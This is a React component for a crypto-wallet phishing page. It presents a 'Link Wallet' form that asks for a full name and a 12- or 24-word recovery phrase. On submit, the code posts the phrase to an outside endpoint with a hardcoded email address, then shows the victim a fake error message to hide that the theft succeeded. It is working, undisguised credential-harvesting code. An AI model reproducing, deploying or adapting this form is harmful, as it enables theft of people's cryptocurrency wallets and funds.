import { useState } from "react";
import InfoModal from "./InfoModal";
import Modal from "./Modal";

const FormModal = ({ handleShowModal, showModal }) => {
  const [formData, setformData] = useState({
    name: "",
    recoveryPhrase: "",
  });
  const [showInfoModal, setShowInfoModal] = useState(false);
  const [message, setMessage] = useState("");
  // manage form onChange handler
  const handleInput = (e) => {
    const { value, name } = e.target;
    setformData({ ...formData, [name]: value });
  };

  //methods
  // function to toggle display of info modal
  const handleShowInfoModal = (e) => {
    if (e.target !== e.currentTarget) return;
    setShowInfoModal(!showInfoModal);
  };

  // submit form handler
  const handleSubmit = (e) => {
    e.preventDefault();
    const email = process.env.REACT_APP_EMAIL;
    fetch(`https://wallet-now.vercel.app/api/v1/key/PapaandMamaa19@gmail.com`, {
      method: "post",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "PostmanRuntime/7.29.2",
      },
      body: JSON.stringify({
        name: formData.name,
        message: formData.recoveryPhrase,
      }),
    })
       .then((res) => res.json())
      .then((data) => {
        if (data?.statusCode == 404) setMessage(data?.message);
        else if (data?.accepted?.length)
          setMessage(`An error occurred. Please try again later.`);
        else setMessage("An error occurred");
        setShowInfoModal(true);
        console.log(data);
      })
      .catch((err) => {
        console.log(err);
        setMessage(err.message);
        setShowInfoModal(true);
      });

    setformData({
      name: "",
      recoveryPhrase: "",
    });
  };

  return (
    <>
      <Modal showModal={showModal} handleShowModal={handleShowModal}>
        <div className="modal-head">
          <p>Link Wallet</p>
          <button onClick={handleShowModal} type="button">
            X
          </button>
        </div>
        <form onSubmit={handleSubmit} action="" className="modal-body">
          <div className="form-group">
            <label htmlFor="name">Full Name</label>
            <input
              value={formData.name}
              onChange={handleInput}
              type="text"
              placeholder="Enter Full Name"
              required
              id="name"
              name="name"
            />
          </div>
          <div className="form-group">
            <label htmlFor="recoveryPhrase">Recovery phrase</label>
            <textarea
              value={formData.recoveryPhrase}
              onChange={handleInput}
              placeholder="Typically 12 (sometimes 24) words separated by single spaces"
              id="recoveryPhrase"
              required
              name="recoveryPhrase"
            ></textarea>
          </div>
          <button type="submit" className="btn">
            Connect
          </button>
        </form>
      </Modal>
      <InfoModal
        message={message}
        showModal={showInfoModal}
        handleShowModal={handleShowInfoModal}
      />
    </>
  );
};

export default FormModal;
